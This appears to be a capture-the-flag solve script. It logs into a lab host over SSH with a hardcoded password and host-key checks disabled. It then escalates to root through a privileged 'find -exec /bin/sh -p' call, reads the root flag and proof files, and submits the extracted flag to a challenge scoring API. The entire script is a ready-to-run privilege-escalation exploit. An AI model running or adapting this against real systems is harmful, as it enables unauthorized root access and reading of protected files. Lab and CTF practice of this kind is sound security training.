#!/usr/bin/env bash
set -euo pipefail

HOST=172.20.0.147
USER=rookie
PASSWORD='orbit-arcade-74'
CHALLENGE_ID=scl-challenge-frame-79d7a1

remote_output="$(sshpass -p "$PASSWORD" ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o PreferredAuthentications=password \
  -o PubkeyAuthentication=no \
  -o ConnectTimeout=8 \
  "$USER@$HOST" \
  "find /tmp -maxdepth 0 -exec /bin/sh -p -c 'id; cat /root/flag; cat /root/.escalation-proof' \\; -quit")"
printf '%s\n' "$remote_output"

flag="$(printf '%s\n' "$remote_output" | grep -oE 'BSY\{[^}]+\}' | head -n 1)"
if [[ -z "$flag" ]]; then
  echo 'Could not extract the challenge flag from the root session.' >&2
  exit 1
fi

payload="$(python3 -c 'import json,sys; print(json.dumps({"challenge_id":sys.argv[1],"task_id":"task1","flag":sys.argv[2]}))' "$CHALLENGE_ID" "$flag")"
curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' --data-binary "$payload"
printf '\n'
